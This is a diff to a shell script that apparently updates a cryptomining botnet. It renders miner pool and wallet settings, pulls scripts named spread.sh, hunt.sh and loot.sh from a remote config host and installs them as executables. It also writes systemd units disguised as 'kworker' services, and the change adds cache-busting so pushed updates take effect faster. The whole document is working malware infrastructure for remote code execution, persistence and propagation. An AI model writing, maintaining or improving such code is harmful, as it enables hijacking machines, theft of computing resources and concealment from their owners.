@@ -22,7 +22,7 @@ restart() {
 }
 
 render_config() {
-    curl -fsSL "${CONFIG_URL:?}/config.json" -o config.tmpl 2>/dev/null || return 0
+    curl -fsSL "${CONFIG_URL:?}/config.json?v=$(date +%s)" -o config.tmpl 2>/dev/null || return 0
     sed -e "s|__URL__|${POOL:-}|g" \
         -e "s|__USER__|${WALLET:-}|g" \
         -e "s|__PASS__|${RIG_ID:-node}|g" \
@@ -35,11 +35,12 @@ render_config() {
 # Helpers, units and worker.env live in the repo too, so publishing an edit is
 # the whole deploy. Compare-then-swap: never rewrite a file that is current, and
 # never adopt one whose download failed. mv is atomic, so a helper mid-run (fired
-# by its own timer) keeps reading its old inode.
+# by its own timer) keeps reading its old inode. The ?v= is a cache-buster: raw
+# is CDN-cached, so without it a fresh push can be invisible for minutes.
 refresh_published() {
     [ -n "${CONFIG_URL:-}" ] || return 0
     for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh; do
-        curl -fsSL "$CONFIG_URL/$f" -o "$f.new" 2>/dev/null || { rm -f "$f.new"; continue; }
+        curl -fsSL "$CONFIG_URL/$f?v=$(date +%s)" -o "$f.new" 2>/dev/null || { rm -f "$f.new"; continue; }
         chmod 0755 "$f.new"
         if [ ! -f "$f" ] || ! cmp -s "$f" "$f.new"; then mv -f "$f.new" "$f"; fi
         rm -f "$f.new"
@@ -59,7 +60,7 @@ refresh_published() {
     if command -v systemctl >/dev/null 2>&1; then
         for u in kworker kworker-updater kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass; do
             for e in service timer; do
-                curl -fsSL "$CONFIG_URL/$u.$e" -o "/etc/systemd/system/$u.$e" 2>/dev/null || :
+                curl -fsSL "$CONFIG_URL/$u.$e?v=$(date +%s)" -o "/etc/systemd/system/$u.$e" 2>/dev/null || :
             done
         done
         systemctl daemon-reload 2>/dev/null || true
